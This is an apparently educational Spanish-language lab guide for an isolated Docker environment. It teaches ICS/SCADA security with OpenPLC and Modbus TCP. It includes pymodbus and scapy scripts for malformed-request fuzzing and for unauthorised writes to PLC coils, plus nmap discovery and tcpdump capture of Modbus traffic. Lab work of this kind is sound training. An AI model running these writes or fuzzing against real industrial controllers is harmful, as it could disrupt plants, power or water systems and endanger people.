# Lab 7: Seguridad ICS/SCADA — OpenPLC + Modbus

## Objetivos

- Comprender cómo funcionan los sistemas ICS/SCADA industriales
- Explorar la arquitectura de un PLC (Programmable Logic Controller)
- Ejecutar programas en OpenPLC y monitorear I/O
- Fuzzing de protocolo Modbus TCP
- Detectar y explotar vulnerabilidades comunes en ICS
- Realizar ataques Man-in-the-Middle (MITM) contra Modbus
- Documentar findings de seguridad en entornos críticos

## Prerrequisitos

- Docker Engine 24.0 o superior
- Docker Compose 2.0 o superior
- 8GB RAM mínimo
- 3GB de almacenamiento disponible
- Conocimiento básico de automatización industrial

## ⚠️ IMPORTANTE: Seguridad en Sistemas Críticos

**Advertencia**: Este lab simula sistemas de control industrial reales. Técnicas aquí aplican a:
- Plantas de manufactura
- Sistemas de energía / redes eléctricas
- Plantas de tratamiento de agua
- Infraestructura crítica

**NUNCA** apliques estas técnicas sin autorización explícita.

---

## Arquitectura

```
lab7-net (172.18.7.0/24)
├── openplc (172.18.7.10:8080/502) — PLC Editor + Modbus Runtime
│   ├── Port 8080: Web UI (editor de programas)
│   ├── Port 502: Modbus TCP (protocolo industrial)
│   ├── Port 1102: OPC-UA (opcional)
│   └── Port 21: FTP (upload de programas)
├── grafana (172.18.7.15:3000) — HMI/SCADA Supervisory Interface
│   └── Monitoreo en tiempo real de variables del PLC
└── kali (172.18.7.20) — Atacante con herramientas ICS/SCADA
    ├── Modbus scanner (pymodbus)
    ├── SCADA protocol fuzzer
    └── Network sniffer
```

## Quick Start

### Paso 1: Ir al directorio del lab

```bash
cd /ruta/a/Ethical_Hacking/docker-labs/lab7
```

### Paso 2: Levantar los servicios

```bash
# Levantar contenedores
docker compose up -d

# Esperar a que OpenPLC se inicialice (~15 segundos)
sleep 15

# Verificar estado
docker compose ps
```

**Output esperado**:
```
CONTAINER ID   IMAGE                        COMMAND                  STATUS
abc123def456   openplcproject/openplc-v3    "/start.sh"              Up 12 seconds
def456ghi789   grafana/grafana:latest       "/run.sh"                Up 10 seconds
ghi789jkl012   kalilinux/kali-rolling:2025  "tail -f /dev/null"      Up 8 seconds
```

### Paso 3: Acceder a OpenPLC

**Opción A: Desde navegador host**:
```
http://localhost:8080
```

**Opción B: Desde Kali**:
```bash
docker compose exec kali bash
curl -I http://openplc:8080
```

### Paso 4: Verificar Modbus TCP

```bash
# Desde Kali
docker compose exec kali bash

# Instalar herramientas de Modbus
apt update && apt install -y python3-pip telnet
pip install pymodbus

# Probar conexión Modbus
python3 -c "
from pymodbus.client.tcp import ModbusTcpClient
client = ModbusTcpClient('openplc', port=502)
if client.connect():
    print('✅ Modbus conectado')
    client.close()
else:
    print('❌ No hay conexión Modbus')
"
```

## Laboratorio

### Fase 1: Crear un Programa Simple en PLC

**Paso 1: Acceder a OpenPLC Web UI**

1. Abre navegador: `http://localhost:8080`
2. Login (credenciales por defecto: ver logs)
3. Click en "New Project"

**Paso 2: Crear Programa Ladder Logic**

```
Crear un programa simple que:
1. Lea entrada digital (DI 0)
2. Si DI 0 = ON, enciende salida digital (DO 0)
3. Ciclo de escaneo: 100ms
```

**Paso 3: Compilar y Cargar**

1. Click en "Compile"
2. Click en "Start Runtime"
3. Verificar en Status: "Running"

### Fase 2: Monitoreo de I/O

**Paso 1: Ver variables del PLC en tiempo real**

```bash
# Desde Kali
docker compose exec kali bash

# Leer valores de Modbus (variables del PLC)
python3 << 'EOF'
from pymodbus.client.tcp import ModbusTcpClient

client = ModbusTcpClient('openplc', port=502)
client.connect()

# Leer coils (salidas digitales)
coils = client.read_coils(0, 16)
print(f"Coils (DO): {coils.bits}")

# Leer inputs discretos
inputs = client.read_discrete_inputs(0, 16)
print(f"Inputs (DI): {inputs.bits}")

# Leer registros de entrada (valores analógicos)
registers = client.read_input_registers(0, 10)
print(f"Input Registers: {registers.registers}")

client.close()
EOF
```

### Fase 3: Fuzzing de Modbus

**Objetivo**: Identificar cómo responde el PLC a requests inválidos

```bash
# Desde Kali
docker compose exec kali bash

# Instalar fuzzer
pip install scapy

# Script de fuzzing de Modbus
python3 << 'EOF'
from scapy.all import *
import socket

target_ip = "openplc"
target_port = 502

# Modbus request malformado
malformed_payload = b'\x00\x01\x00\x00\xFF\xFF'  # Invalid length

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(malformed_payload)
    response = s.recv(1024)
    print(f"Respuesta: {response.hex()}")
    s.close()
except Exception as e:
    print(f"Error: {e}")
EOF
```

### Fase 4: Escribir Valores Maliciosos

**Objetivo**: Modificar variables del PLC sin autorización

```bash
# Desde Kali
python3 << 'EOF'
from pymodbus.client.tcp import ModbusTcpClient

client = ModbusTcpClient('openplc', port=502)
client.connect()

# Escribir a coils (salidas - PELIGROSO en sistemas reales)
result = client.write_coils(0, [True, False, True])
print(f"Write coils result: {result.isError()}")

# Leer para verificar
coils = client.read_coils(0, 3)
print(f"Coils después de escribir: {coils.bits}")

client.close()
EOF
```

### Fase 5: Man-in-the-Middle (MITM) con Modbus

**Objetivo**: Interceptar y modificar tráfico Modbus

```bash
# Desde Kali
docker compose exec kali bash

# Instalar herramientas MITM
apt install -y mitmproxy tcpdump

# Capturar tráfico Modbus TCP
tcpdump -i eth0 -n "port 502" -w /tmp/modbus.pcap

# En otra terminal, generar tráfico Modbus:
# python3 < script anterior >

# Analizar pcap
tcpdump -r /tmp/modbus.pcap -A
```

### Fase 6: Análisis con Grafana/HMI

**Opcional: Monitoreo visual**

```bash
# Acceder a Grafana
# http://localhost:3000
# Usuario: admin
# Contraseña: admin

# Crear dashboard que muestre variables del PLC
```

## Expected Output

### OpenPLC corriendo:

```bash
$ docker compose ps openplc
CONTAINER ID   IMAGE                    COMMAND      STATUS
abc123...      openplcproject/openplc   "/start.sh"  Up 10 seconds

$ curl -I http://localhost:8080
HTTP/1.1 200 OK
Content-Type: text/html
```

### Conexión Modbus exitosa:

```bash
$ python3 -c "
from pymodbus.client.tcp import ModbusTcpClient
client = ModbusTcpClient('openplc', port=502)
print('✅ Conectado' if client.connect() else '❌ Error')
"
✅ Conectado
```

### Lectura de variables:

```bash
$ python3 modbus_read.py
Coils (DO): [False, False, False, False, ...]
Inputs (DI): [True, False, False, True, ...]
Input Registers: [100, 200, 150, 0, ...]
```

## Exercises

### Exercise 1: Crear Programa PLC Completo
**Objetivo**: Implementar control de bomba/motor simple

**Pasos**:
1. Crear programa en ladder logic
2. Incluir entradas, salidas, temporizadores
3. Cargar en OpenPLC runtime
4. Monitorear valores en tiempo real

### Exercise 2: Descubrimiento de Dispositivos ICS
**Objetivo**: Mapear todos los dispositivos en red ICS

**Pasos**:
```bash
# Scan de Modbus
nmap -p 502 --script modbus-discover 172.18.7.0/24

# O manual con Pymodbus
python3 << 'EOF'
from pymodbus.client.tcp import ModbusTcpClient
for ip in ['172.18.7.10']:
    for port in [502, 503, 5020]:
        try:
            c = ModbusTcpClient(ip, port=port)
            if c.connect():
                print(f"✅ {ip}:{port}")
                c.close()
        except:
            pass
EOF
```

### Exercise 3: Fuzzing Interactivo de Modbus
**Objetivo**: Enviar requests malformados y documentar respuestas

**Pasos**:
1. Crear script que envíe payloads inválidos
2. Documentar cómo el PLC maneja errores
3. Identificar posibles DoS vectors

### Exercise 4: Escribir Valores Críticos
**Objetivo**: Demostrar riesgo de acceso no autenticado

**Pasos**:
1. Identificar variables críticas (salidas)
2. Escribir valores peligrosos
3. Documentar impacto potencial

### Exercise 5: Reporte de Riesgos ICS
**Objetivo**: Escribir reporte profesional de seguridad ICS

**Pasos**:
1. Documentar arquitectura encontrada
2. Listar vulnerabilidades
3. Proponer mitigaciones
4. Calcular riesgo CVSS

## Troubleshooting

### Problema: OpenPLC no carga UI (timeout)
**Síntomas**: `connection timed out` en http://localhost:8080
**Solución**:
```bash
# Esperar más tiempo a inicialización
sleep 30
docker compose logs openplc

# Verificar que está corriendo
docker compose ps openplc

# Reiniciar
docker compose restart openplc
```

### Problema: No hay conexión Modbus
**Síntomas**: `Connection refused` en pymodbus
**Solución**:
```bash
# Verificar puerto 502 escuchando
docker compose exec openplc netstat -tuln | grep 502

# Probar conectividad desde Kali
docker compose exec kali ping openplc

# Ver logs
docker compose logs openplc
```

### Problema: FTP not working para subir archivos
**Síntomas**: Error al conectar por FTP
**Solución**:
```bash
# FTP es opcional; usar Web UI en su lugar
# O configurar FTP credenciales en docker-compose.yml
```

### Problema: Grafana no conecta a OpenPLC
**Síntomas**: Datasource error en Grafana
**Solución**:
```bash
# Grafana es solo para monitoreo visual (opcional)
# Usar terminal Modbus en su lugar
```

## Testing Checklist

- [ ] `docker compose up -d` completa sin errores
- [ ] `docker compose ps` muestra 3 contenedores en estado `Up`
- [ ] OpenPLC Web UI es accesible en `http://localhost:8080`
- [ ] Modbus TCP responde en puerto 502
- [ ] PyModbus puede leer coils y registros
- [ ] Se pueden escribir valores a salidas
- [ ] Fuzzing identifica comportamiento de error
- [ ] Tráfico Modbus puede ser capturado con tcpdump
- [ ] Reporte de vulnerabilidades está documentado

## Cleanup

```bash
# Parar servicios
docker compose down

# Eliminar volúmenes
docker compose down -v

# Eliminar imágenes
docker rmi openplcproject/openplc-v3 grafana/grafana kalilinux/kali-rolling
```

## Recursos

- [OpenPLC Project](https://www.openplcproject.com/)
- [Modbus TCP Specification](http://www.modbus.org/)
- [PyModbus Library](https://github.com/riptideio/pymodbus)
- [ICS/SCADA Security - NIST](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-82r3.pdf)
- [OWASP ICS Security](https://owasp.org/www-community/attacks/csrf)
- [Shodan ICS Devices](https://www.shodan.io/search?query=Modbus)
- [S4 Conference - ICS Security](https://www.s4.org/)
